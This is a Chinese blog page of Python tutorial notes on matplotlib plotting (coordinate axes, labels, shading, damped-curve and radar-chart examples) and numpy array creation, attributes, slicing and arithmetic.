-<p><img src="https://i.loli.net/2021/04/17/eDwWkaCUdbRng2I.png" alt="image-20210417102315753"></p>
-<p>（6）axes()默认创建一个subplot(111)坐标系，参数rect=[left,bottom,width,height]中<strong>4个变量的范围都为[0,1]，</strong>表示坐标系与全局绘图区域的关系；axisbg指背景色，默认为white。</p>
-<pre><code class="python">&gt;&gt;&gt; plt.axes([0.1,0.1,0.7,0.3], axisbg=&#39;y&#39;)
-&gt;&gt;&gt; plt.show()</code></pre>
-<p>（7）plt子库提供了一组读取和显示相关的函数，用于在绘图区域中增加显示内容及读入数据，这些函数需要与其他函数搭配使用，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">plt.legend()</td>
-<td align="center">在绘图区域中放置绘图标签（也称图注）</td>
-</tr>
-<tr>
-<td align="center">plt.show()</td>
-<td align="center">显示创建的绘图对象</td>
-</tr>
-<tr>
-<td align="center">plt.matshow()</td>
-<td align="center">在窗口显示数组矩阵</td>
-</tr>
-<tr>
-<td align="center">plt.imshow()</td>
-<td align="center">在axes上显示图像</td>
-</tr>
-<tr>
-<td align="center">plt.imsave()</td>
-<td align="center">保存数组为图像文件</td>
-</tr>
-<tr>
-<td align="center">plt.imread()</td>
-<td align="center">从文件图像中读取数组</td>
-</tr>
-</tbody></table>
-<p>（8）pyplot模块提供了17个用于绘制“基础图表”的常用函数，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th align="center">操作</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><strong>plt.plot(x,y,label,color,width)</strong></td>
-<td align="center">根据x，y数组绘制直、曲线</td>
-</tr>
-<tr>
-<td align="center">plt.boxplot(data,notch,position)</td>
-<td align="center">绘制一个箱型图</td>
-</tr>
-<tr>
-<td align="center">plt.bar(left,height,width,bottom)</td>
-<td align="center">绘制一个条形图</td>
-</tr>
-<tr>
-<td align="center">plt.barh(bottom,width,height,left)</td>
-<td align="center">绘制一个横向条形图</td>
-</tr>
-<tr>
-<td align="center">plt.polar(theta,r)</td>
-<td align="center">绘制极坐标图</td>
-</tr>
-<tr>
-<td align="center">plt.pie(data,explode)</td>
-<td align="center">绘制饼图</td>
-</tr>
-<tr>
-<td align="center">plt.psd(x,NFFT=256,pad_to,Fs)</td>
-<td align="center">绘制功率谱密度图</td>
-</tr>
-<tr>
-<td align="center">plt.specgram(x,NFFT=256,pad_to,F)</td>
-<td align="center">绘制谱图</td>
-</tr>
-<tr>
-<td align="center">plt.cohere(x,y,NFFT=256,Fs)</td>
-<td align="center">绘制X-Y的相关性函数</td>
-</tr>
-<tr>
-<td align="center">plt.scatter()</td>
-<td align="center">绘制散点图(x,y是长度相同的序列)</td>
-</tr>
-<tr>
-<td align="center">plt.step(x,y,where)</td>
-<td align="center">绘制步阶图</td>
-</tr>
-<tr>
-<td align="center">plt.hist(x,bins,normed)</td>
-<td align="center">绘制直方图</td>
-</tr>
-<tr>
-<td align="center">plt.contour(X,Y,Z,N)</td>
-<td align="center">绘制等值线</td>
-</tr>
-<tr>
-<td align="center">plt.vlines()</td>
-<td align="center">绘制垂直线</td>
-</tr>
-<tr>
-<td align="center">plt.stem(x,y,linefmt,markerfmt,basefmt)</td>
-<td align="center">绘制曲线每个点到水平轴线的垂线</td>
-</tr>
-<tr>
-<td align="center">plt.plot_data()</td>
-<td align="center">绘制数据日期</td>
-</tr>
-<tr>
-<td align="center">plt.plotfile()</td>
-<td align="center">绘制数据后写入文件</td>
-</tr>
-</tbody></table>
-<p>（9）plot()函数是用于绘制直线的最基础的函数，调用方式灵活，x和y可以是numpy计算出的数组，并用关键字参数指定各种属性。其中，labe表示设置标签并在图例中显示，color表示曲线的颜色，linewidth表示曲线的宽度。<strong>在字符串前后添加$符号，matplotlib会使用其内置的latex引擎绘制数学公式。</strong></p>
-<p>（10）实例：在坐标系中绘制基本的三角函数</p>
-<pre><code class="python">import numpy as np
-import matplotlib.pyplot as plt
-x = np.linspace(0, 6, 100)
-y = np.cos(2 * np.pi * x) * np.exp(-x)+0.8
-plt.plot(x,y,&#39;k&#39;,color=&#39;r&#39;,linewidth=3,linestyle=&quot;-&quot;)
-plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/17/MGgRwy7FZj2orLb.png" alt="image-20210417111653192"></p>
-<p>（11）plt库有两个坐标体系，<strong>图像坐标和数据坐标。</strong></p>
-<ul>
-<li>图像坐标将图像所在区域左下角视为原点，将x方向和y方向长度设定为1。整体绘图区域有一个图像坐标，每个axes()和subplot()函数产生的子图也有属于自己的图像坐标。**axes()函数参数rect指当前产生的子区域相对于整个绘图区域的图像坐标。</li>
-<li>数据坐标以当前绘图区域的坐标轴为参考，显示每个点的相对位置，这与坐标系里面标记数据点一致。</li>
-</ul>
-<p>（12）下表给出了与plt库的坐标轴设置相关的函数</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">plt.axis(‘v’,’off’,’equal’,’scaled’,’tight’,’image’)</td>
-<td align="center">获取设置轴属性的快捷方法</td>
-</tr>
-<tr>
-<td align="center">plt.xlim(xmin,xmax)</td>
-<td align="center">设置当前x轴取值范围</td>
-</tr>
-<tr>
-<td align="center">plt.ylim(ymin,ymax)</td>
-<td align="center">设置当前y轴取值范围</td>
-</tr>
-<tr>
-<td align="center">plt.xscale()</td>
-<td align="center">设置x轴缩放</td>
-</tr>
-<tr>
-<td align="center">plt.yscale()</td>
-<td align="center">设置y轴缩放</td>
-</tr>
-<tr>
-<td align="center">plt.autoscale()</td>
-<td align="center">自动缩放轴视图的数据</td>
-</tr>
-<tr>
-<td align="center">plt.text(x,y,s,fontdic,withdash)</td>
-<td align="center">为axes图轴添加注释</td>
-</tr>
-<tr>
-<td align="center">plt.thetagrids(angles,labels,fmt,frac)</td>
-<td align="center">设置极坐标网络theta的位置</td>
-</tr>
-<tr>
-<td align="center">plt.grid(on/off)</td>
-<td align="center">打开或者关闭坐标网络</td>
-</tr>
-</tbody></table>
-<pre><code class="python">&gt;&gt;&gt; plt.plot([1,2,4],[1,2,3])
-&gt;&gt;&gt; plt.axis()   #获得当前坐标轴范围
-(0.85, 4.15, 0.9, 3.1)
-&gt;&gt;&gt; plt.axis([0,5,0,8]) #4个变量分别是[xmin,xmax,ymin,ymax]
-&gt;&gt;&gt; plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/17/ZP32HJmWCGBtkSQ.png" alt="image-20210417113325710"></p>
-<p>（13）下表给出了13个设置坐标系标签的相关函数</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">plt.figlegend(handles,label,loc)</td>
-<td align="center">为全局绘图区域放置图注</td>
-</tr>
-<tr>
-<td align="center">plt.legend()</td>
-<td align="center">为当前坐标图放置图注</td>
-</tr>
-<tr>
-<td align="center">plt.xlabel(s)</td>
-<td align="center">设置当前x轴的标签</td>
-</tr>
-<tr>
-<td align="center">plt.ylabel(s)</td>
-<td align="center">设置当前y轴的标签</td>
-</tr>
-<tr>
-<td align="center">plt.xticks(array,’a’,’b’,’c’)</td>
-<td align="center">设置当前x轴刻度位置的标签和值</td>
-</tr>
-<tr>
-<td align="center">plt.yticks(array,’a,’b’,’c’)</td>
-<td align="center">设置当前y轴刻度位置的标签和值</td>
-</tr>
-<tr>
-<td align="center">plt.clabel(cs,v)</td>
-<td align="center">为等值线图设置标签</td>
-</tr>
-<tr>
-<td align="center">plt.get_figlabels()</td>
-<td align="center">返回当前绘图区域的标签列表</td>
-</tr>
-<tr>
-<td align="center">plt.figtext(x,y,s,fontdic)</td>
-<td align="center">为全局绘图区域添加文字</td>
-</tr>
-<tr>
-<td align="center">plt.title()</td>
-<td align="center">设置标题</td>
-</tr>
-<tr>
-<td align="center">plt.suptitle()</td>
-<td align="center">为当前绘图区域添加中心标题</td>
-</tr>
-<tr>
-<td align="center">plt.text(x,y,fontdic,withdash)</td>
-<td align="center">为坐标图轴添加注释</td>
-</tr>
-<tr>
-<td align="center">plt.annotate(note,xy,xytext,xycoords,textcoords,arrowprops)</td>
-<td align="center">用箭头在指定数据点创建一个注释或一段文本</td>
-</tr>
-</tbody></table>
-<p>（14）绘制一个带标签的坐标系</p>
-<pre><code class="python">import matplotlib.pyplot as plt
-import matplotlib
-matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
-matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]
-plt.plot([1,2,4],[1,2,3])
-plt.title(&quot;坐标系标题&quot;)
-plt.xlabel(&#39;时间(s)&#39;)
-plt.ylabel(&#39;范围(m)&#39;)
-plt.xticks([1,2,3,4,5],[r&#39;$\pi/3$&#39;,r&#39;$2\pi/3$&#39;,r&#39;$\pi$&#39;,\
-                        r&#39;$4\pi/3$&#39;,r&#39;$5\pi/3$&#39;])
-plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/17/KRIyBVuktdjeqJY.png" alt="image-20210417125952062"></p>
-<p>（15）plt库提供了3个区域填充函数，对绘图区域填充颜色，如下表示所示</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">fill(x,y,c,color)</td>
-<td align="center">填充多边形</td>
-</tr>
-<tr>
-<td align="center">fill_between(x,y1,y2,where,color)</td>
-<td align="center">填充两条曲线围成的多边形</td>
-</tr>
-<tr>
-<td align="center">fill_betweenx(y,x1,x2,where,hold)</td>
-<td align="center">填充两条水平线之间的区域</td>
-</tr>
-</tbody></table>
-<p>（16）绘制一个带局部阴影的坐标系。</p>
-<pre><code class="python">import matplotlib.pyplot as plt
-import numpy as np
-x = np.linspace(0,10,1000)
-y = np.cos(2*np.pi*x) * np.exp(-x)+0.8
-plt.plot(x,y,&#39;k&#39;,color=&#39;r&#39;,label=&quot;$exp-decay$&quot;,linewidth=3)
-plt.axis([0,6,0,1.8])
-ix = (x&gt;0.8) &amp; (x&lt;3)
-plt.fill_between(x,y,0,where=ix,\
-                 facecolor=&#39;gray&#39;,alpha=0.25)
-plt.text(0.5*(0.8+3),0.2,r&quot;$\int_a^b f(x)\mathrm&#123;d&#125;x$&quot;,\
-         horizontalalignment=&#39;center&#39;)
-plt.legend()
-plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/17/8znfgdYXk9KUowq.png" alt="image-20210417131059448"></p>
-<h2 id="实例：科学坐标图绘制"><a href="#实例：科学坐标图绘制" class="headerlink" title="实例：科学坐标图绘制"></a>实例：科学坐标图绘制</h2><p>（1）科学坐标图有4个要素：<strong>坐标轴、数据曲线、标题和图注</strong>。本实例以阻尼衰减曲线绘制来具体阐述科学坐标系的绘制方法。</p>
-<p>（2）本实例同时展示了在同一个区域用不同颜色和线条绘制两种曲线的方法，两条曲线分别为(x,y)和(x,z)。</p>
-<pre><code class="python">x = np.linspace(0.0, 6.0, 100)
-y = np.cos(2*np.pi*x) * np.exp(-x)+0.8
-z = 0.5 * np.cos(x ** 2)+0.8</code></pre>
-<pre><code class="python">import numpy as np
-import matplotlib.pyplot as plt
-import matplotlib
-matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
-matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]
-def Draw(pcolor, nt_point, nt_text, nt_size):   #Draw()函数用于绘制曲线
-    plt.plot(x,y,&#39;k&#39;,label=&quot;$exp_decay$&quot;,color=pcolor,\  #根据x、y数组绘制直、曲线
-             linewidth=3, linestyle=&#39;-&#39;)
-    plt.plot(x,z,&quot;b--&quot;,label=&quot;$cos(x^2)$&quot;, linewidth=1)
-    plt.xlabel(&#39;时间(s)&#39;)
-    plt.ylabel(&#39;幅度(mV)&#39;)
-    plt.title(&#39;阻尼衰减曲线绘制&#39;)
-    plt.annotate(&#39;$\cos(2 \pi t) \exp(-t)$&#39;,xy=nt_point,\   #用箭头在指定数据点创建一个注释或一段文本
-                 xytext=nt_text,fontsize=nt_size,arrowprops= \
-                 dict(arrowstyle=&#39;-&gt;&#39;, connectionstyle=&quot;arc3,rad=.1&quot;))
-def Shadow(a,b):                             #Shadow()函数用于设置阴影
-    ix = (x&gt;a) &amp; (x&lt;b)
-    plt.fill_between(x,y,0,where=ix,facecolor=&#39;gray&#39;,alpha=0.25)
-    plt.text(0.5*(a+b),0.2,r&quot;$\int_a^b f(x)\mathrm&#123;d&#125;x$&quot;,\
-             horizontalalignment=&#39;center&#39;)
-def XY_Axis(x_start, x_end, y_start, y_end): #XY_Axis()函数用于修改坐标轴
-    plt.xlim(x_start,x_end)   #设置当前x轴的取值范围
-    plt.ylim(y_start,y_end)
-    plt.xticks([np.pi/3,2 * np.pi/3, 1*np.pi, 4*np.pi/3,\     #设置当前x轴刻度位置的标签和值
-                5*np.pi/3],[&#39;$\pi/3$&#39;,&#39;$2\pi/3$&#39;,&#39;$\pi$&#39;,&#39;$4\pi/3$&#39;,&#39;$5\pi/3$&#39;])
-x = np.linspace(0.0, 6.0, 100)      #创建一个由0.0到6.0，等分成100个元素的数组
-y = np.cos(2 * np.pi * x) * np.exp(-x)+0.8
-z = 0.5 * np.cos(x ** 2)+0.8
-note_point,note_text,note_size=(1,np.cos(2*np.pi)*\
-                                np.exp(-1)+0.8),(1,1.4), 14
-fig = plt.figure(figsize=(8, 6),facecolor=&quot;white&quot;)   #创建一个全局绘图区域
-plt.subplot(111)                                     #在全局绘图区域中创建一个子绘图区域
-Draw(&quot;red&quot;,note_point,note_text,note_size)
-XY_Axis(0,5,0,1.8)
-Shadow(0.8,3)
-plt.legend()               #为当前坐标图放置图注
-plt.savefig(&#39;sample.JPG&#39;)  #将产生的坐标图保存为文件
-plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/17/yhvMBaQ2HW8e7PU.png" alt="image-20210417190906901"></p>
-<p>（3）其中第13行的annotate()函数配合箭头在曲线绘图界面添加动态注释，箭头的线条和尖端都有多种样式和参数，可以通过arrowprops和connetionstyle选择，具体可参考官方文档。</p>
-<h2 id="实例：多级雷达图绘制"><a href="#实例：多级雷达图绘制" class="headerlink" title="实例：多级雷达图绘制"></a>实例：多级雷达图绘制</h2><h3 id="单一数据雷达图"><a href="#单一数据雷达图" class="headerlink" title="单一数据雷达图"></a>单一数据雷达图</h3><p>（1）雷达图是通过多个离散属性比较对象的最直观工具。</p>
-<pre><code class="python">import numpy as np
-import matplotlib.pyplot as plt
-import matplotlib
-matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;       #第3行到第5用于支持中文
-matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]
-labels = np.array([&#39;综合&#39;,&#39;KDA&#39;,&#39;发育&#39;,&#39;推进&#39;,&#39;生存&#39;,&#39;输出&#39;]) #设置属性标签，包含6个属性
-nAttr = 6
-data = np.array([7, 5, 6, 9, 8, 7]) #预设一组玩家数据值
-angles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)
-data = np.concatenate((data, [data[0]]))    #对data进行封闭
-angles = np.concatenate((angles, [angles[0]]))   #对angles进行封闭
-labels=np.concatenate((labels,[labels[0]]))    #对labels进行封闭，若不对此进行封闭则会报错
-fig = plt.figure(facecolor=&quot;white&quot;)
-plt.subplot(111, polar=True)     #在全局绘图区域中创建一个子绘图区域
-plt.plot(angles,data,&#39;bo-&#39;,color = &#39;g&#39;,linewidth=2)
-plt.fill(angles,data,facecolor=&#39;g&#39;,alpha=0.25)
-plt.thetagrids(angles*180/np.pi,labels)
-plt.figtext(0.52, 0.95, &#39;DOTA能力值雷达图&#39;,ha=&#39;center&#39;)    #为全局绘图区域添加文字
-plt.grid(True)
-plt.savefig(&#39;dota_radar.JPG&#39;)
-plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/17/zpKIPkvLClZGeT8.png" alt="image-20210417215652944"></p>
-<p>（2）np.linspace()函数设定起点为0、末值为2π、返回一个两端点间数值平均分布的长为nAttr的数组angles，<strong>它表示从一个属性点到下一个属性点笔画需要旋转的角</strong>度，它取决于属性<strong>nAttr的大小，也是雷达图的多边形边数。</strong></p>
-<p>（3）np.concatenate()函数用于将数据和角度的数组首尾闭合起来，便于调用plot()函数绘制。</p>
-<p>（4）建立基本绘图对象后，使用subplot()函数建立极坐标系的子分区。<strong>polar参数指定了绘制类型为极坐标</strong>，这是subplot()除默认正方形坐标系外唯一支持的内置坐标图。</p>
-<p>（5）建立极坐标后，使用plot()函数依照data提供的数据画出不规则六边形，然后使用fill()函数填充半透明颜色。</p>
-<p>（6）thetagrids()函数为极坐标设置标签，这里把标签放在六角形的顶点上，需要将角度数据和文字一起作为参数传给thetagrids函数。</p>
-<h3 id="多数据雷达图"><a href="#多数据雷达图" class="headerlink" title="多数据雷达图"></a>多数据雷达图</h3><p><strong>霍兰德人格分析雷达图</strong></p>
-<pre><code class="python">import numpy as np
-import matplotlib.pyplot as plt
-import matplotlib
-matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
-matplotlib.rcParams[&#39;font.sans-serif&#39;] = [&#39;SimHei&#39;]
-radar_labels = np.array([&#39;研究型(I)&#39;,&#39;艺术型(A)&#39;,&#39;社会型(S)&#39;,\
-                         &#39;企业型(E)&#39;,&#39;常规型(C)&#39;,&#39;现实型(R)&#39;])
-
-nAttr = 6
-data = np.array([[0.40, 0.32, 0.35, 0.30, 0.30, 0.88],
-                 [0.85, 0.35, 0.30, 0.40, 0.40, 0.30],
-                 [0.43, 0.89, 0.30, 0.28, 0.22, 0.30],
-                 [0.30, 0.25, 0.48, 0.85, 0.45, 0.40],
-                 [0.20, 0.38, 0.87, 0.45, 0.32, 0.28],
-                 [0.34, 0.31, 0.38, 0.40, 0.92, 0.28]]) #数据值
-data_labels=(&#39;工程师&#39;,&#39;实验员&#39;,&#39;艺术家&#39;,&#39;推销员&#39;,&#39;社会工作者&#39;,&#39;记事员&#39;)
-angles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)
-data = np.concatenate((data,[data[0]]))
-angles = np.concatenate((angles,[angles[0]]))
-radar_labels = np.concatenate((radar_labels,[radar_labels[0]]))
-fig = plt.figure(facecolor=&quot;white&quot;)
-plt.subplot(111,polar=True)
-#plt.plot(angles,data,&#39;bo-&#39;, color=&#39;gray&#39;,linewidth=1,alpha=0.2)
-
-plt.plot(angles,data,&#39;o-&#39;,linewidth=1.5,alpha=0.2)
-plt.fill(angles,data,alpha=0.25)
-plt.thetagrids(angles*180/np.pi, radar_labels)
-plt.figtext(0.52,0.95,&#39;霍兰德人格分析&#39;, ha=&#39;center&#39;, size=20)
-legend=plt.legend(data_labels,loc=(0.94,0.80),labelspacing=0.1) #为当前坐标图放置图注
-plt.setp(legend.get_texts(),fontsize=&#39;small&#39;)
-plt.grid(True)
-plt.savefig(&#39;holland_radar.JPG&#39;)
-plt.show()</code></pre>
-<p><img src="https://i.loli.net/2021/04/18/apjLAPcXIixFnqy.png" alt="image-20210418141558700"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/运用Python语言(三)-科学计算和可视化01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9601/">运用Python语言(三)-科学计算和可视化01</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9601/" class="archive-article-date">
-  	<time datetime="2021-04-10T15:28:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p><strong>科学计算需要采用矩阵运算库numpy和绘制库matplotlib。</strong></p>
-<p>（1）开展基本的科学计算需要两个步骤：组织数据和展示数据。</p>
-<ul>
-<li>组织数据是运算的基础，也是<strong>将客观世界数字化</strong>的必要手段。</li>
-<li>展示数据是<strong>体现运算结果</strong>的重要方式，也是展示结论的有力武器。</li>
-</ul>
-<p>（2）科学计算以<strong>矩阵</strong>而不是单一数值为基础，增加了计算密度，能够表达更为复杂的数据运算逻辑。</p>
-<p>（3）矩阵有维度概念，一维矩阵是线性的，类似于列表，二维矩阵是表格状的，这是常用的数据表示形式。</p>
-<h2 id="numpy库的使用"><a href="#numpy库的使用" class="headerlink" title="numpy库的使用"></a>numpy库的使用</h2><p><strong>numpy是用于处理含有同种元素的多维数组运算的第三方库</strong></p>
-<h3 id="numpy库概述"><a href="#numpy库概述" class="headerlink" title="numpy库概述"></a>numpy库概述</h3><p>（1）Python标准库中提供了一个array类型，用于保存数组类型数据，然而这个类型不支持多维数据，处理函数也不够丰富，不适合数值运算。因此，第三方库numpy得到了迅速发展，至今，<strong>numpy已经成为了科学计算事实上的标准库</strong>。</p>
-<p>（2）<strong>numpy库处理的最基础数据类型是由同种元素构成的多维数组</strong>。数组中所有元素的类型必须相同，数组中元素可以用整数索引，序号从0开始。</p>
-<p>（3）ndarray类型的维度叫做轴（axes），轴的个数叫做秩（rank）。一维数组的秩为1，二维数组的秩为2，二维数组相当于由两个一维数组构成。</p>
-<p>（4）由于numpy库中函数较多且命名容易与常用名混淆，建议采用如下方式引用numpy库：</p>
-<pre><code class="python">import numpy as np
-#as保留字与import一起使用能够改变后续代码中库的命名空间，有助于提高代码的可读性。简单地说，在程序的后续部分，np代替numpy</code></pre>
-<h3 id="numpy库解析"><a href="#numpy库解析" class="headerlink" title="numpy库解析"></a>numpy库解析</h3><p>（1）numpy库常用的创建数组（ndarray类型）函数有7个，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">np.array([x,y,z],dtype=int)</td>
-<td align="center">从Python列表和元组创造数组</td>
-</tr>
-<tr>
-<td align="center">np.arange(x,y,i)</td>
-<td align="center">创建一个由x到y，以i为步长的数组</td>
-</tr>
-<tr>
-<td align="center">np.linspace(x,y,n)</td>
-<td align="center">创建一个由x到y，等分成n个元素的数组</td>
-</tr>
-<tr>
-<td align="center">np.indices((m,n))</td>
-<td align="center">创建一个m行n列的矩阵</td>
-</tr>
-<tr>
-<td align="center">np.random.rand(m,n)</td>
-<td align="center">创建一个m行n列的随机数组</td>
-</tr>
-<tr>
-<td align="center">np.ones((m,n),dtype)</td>
-<td align="center">创建一个m行n列全1的数组，dtype是数据类型</td>
-</tr>
-<tr>
-<td align="center">np.empty((m,n),dtype)</td>
-<td align="center">创建一个m行n列全0的数组，dtype是数组类型</td>
-</tr>
-</tbody></table>
-<p>（2）创建一个简单的数组后，可以查看ndarray类的基本属性，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th align="center">属性</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">ndarray.ndim</td>
-<td align="center">数组轴的个数，也被称作秩</td>
-</tr>
-<tr>
-<td align="center">ndarray.shape</td>
-<td align="center">数组在每个维度上大小的的整数元组</td>
-</tr>
-<tr>
-<td align="center">ndarray.size</td>
-<td align="center">数组元素的总个数</td>
-</tr>
-<tr>
-<td align="center">ndarray.dtype</td>
-<td align="center">数组元素的数据类型，dtype类型可用于创建数组</td>
-</tr>
-<tr>
-<td align="center">ndarray.itemsize</td>
-<td align="center">数组中每个元素的字节大小</td>
-</tr>
-<tr>
-<td align="center">ndarray.data</td>
-<td align="center">包含实际数组元素的缓冲区地址</td>
-</tr>
-<tr>
-<td align="center">ndarray.flat</td>
-<td align="center">数组元素的迭代器</td>
-</tr>
-</tbody></table>
-<pre><code class="python">&gt;&gt;&gt; import numpy as np
-&gt;&gt;&gt; a = np.ones((4,5))
-&gt;&gt;&gt; print(a)
-[[1. 1. 1. 1. 1.]
- [1. 1. 1. 1. 1.]
- [1. 1. 1. 1. 1.]
- [1. 1. 1. 1. 1.]]
-&gt;&gt;&gt; a.ndim
-2
-&gt;&gt;&gt; a.shape
-(4, 5)
-&gt;&gt;&gt; a.dtype
-dtype(&#39;float64&#39;)</code></pre>
-<p>（3）数组在numpy中被当做对象，可以采用&lt;a&gt;.&lt;b&gt;()方式调用一些方法。下表给出了改变数组基础形态的操作方法，例如改变和调换数组维度等。其中，<strong>np.flatten()函数用于数组降维，相当于平铺数组中的数据，</strong>该功能在矩阵运算和图像处理中用处很大。</p>
-<table>
-<thead>
-<tr>
-<th align="center">方法</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">ndarray.reshape(n,m)</td>
-<td align="center">不改变数组ndarray，返回一个维度为(n,m)的数组</td>
-</tr>
-<tr>
-<td align="center">ndarray.resize(new_shape)</td>
-<td align="center">与reshape()作用相同，直接修改ndarray</td>
-</tr>
-<tr>
-<td align="center">ndarray.swqpaxes(ax1,ax2)</td>
-<td align="center">将数组n个维度中任意两个维度进行调换</td>
-</tr>
-<tr>
-<td align="center"><strong>ndarray.flatten()</strong></td>
-<td align="center">对数组进行降维，返回一个折叠后的一维数组</td>
-</tr>
-<tr>
-<td align="center">ndarray.ravel()</td>
-<td align="center">作用通np.flatten(),但是返回数组的一个视图</td>
-</tr>
-</tbody></table>
-<p>（4）下表给出了ndarray类的索引和切片方法。数组切片得到的是原始数组的视图，所有修改都会直接反映到源数组。如果需要得到ndarray切片的一份副本，需要进行复制操作，比如arange[5:8].copy()。</p>
-<table>
-<thead>
-<tr>
-<th align="center">方法</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">x[i]</td>
-<td align="center">索引第i个元素</td>
-</tr>
-<tr>
-<td align="center">x[-i]</td>
-<td align="center">从后向前索引第i个元素</td>
-</tr>
-<tr>
-<td align="center">x[n:m]</td>
-<td align="center">默认步长为1，从前往后索引，不包含m</td>
-</tr>
-<tr>
-<td align="center">x[-m:-n]</td>
-<td align="center">默认步长为，从后往前索引，<strong>结束位置为n</strong>,(不是-n)</td>
-</tr>
-<tr>
-<td align="center">x[n：m：i]</td>
-<td align="center">指定i步长的由n到m的索引</td>
-</tr>
-</tbody></table>
-<pre><code class="python">&gt;&gt;&gt; import numpy as np
-&gt;&gt;&gt; a = np.random.rand(5,3)  #生成5*3的数组，用随机数填充
-&gt;&gt;&gt; a[2]  #获取第2行的数据
-array([0.31158762, 0.82371017, 0.73224191])
-&gt;&gt;&gt; a[1:3]
-array([[0.53039082, 0.14939241, 0.12996747],
-       [0.31158762, 0.82371017, 0.73224191]])
-&gt;&gt;&gt; a[-5:-2:2]
-array([[0.86506778, 0.97968013, 0.35782942],
-       [0.31158762, 0.82371017, 0.73224191]])
-&gt;&gt;&gt; print(a)
-[[0.86506778 0.97968013 0.35782942]
- [0.53039082 0.14939241 0.12996747]
- [0.31158762 0.82371017 0.73224191]
- [0.12440417 0.96267856 0.6107584 ]
- [0.3656373  0.35113364 0.08881953]]</code></pre>
-<p><strong>注意</strong>：上例中，</p>
-<ul>
-<li>从前往后索引，依次为a[0]、a[1]、a[2]、a[3]、a[4]</li>
-<li>从后往前索引，依次为a[-1]、a[-2]、a[-3]、a[-4]、a[-5]</li>
-</ul>
-<p>（5）除了ndarray类型方法外，numpy库提供了一批运算函数，如下表所示。这些函数中，输出参数y可选，如果没有指定，将创建并返回一个新的数组保存计算结果；如果指定参数，则将结果保存到参数中。</p>
-<ul>
-<li>例如，两个数组相加可以简单写为a+b，而np.add(a,b,a)则表示a+=b。</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="center">函数</th>
-<th align="center">方法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">np.add(x1,x2[,y])</td>
-<td align="center">y = x1 + x2</td>
-</tr>
-<tr>
-<td align="center">np.subtract(x1,x2[,y])</td>
-<td align="center">y = x1 - x2</td>
-</tr>
-<tr>
-<td align="center">np.multiply(x1,x2[,y])</td>
-<td align="center">y = x1 * x2</td>
-</tr>
-<tr>
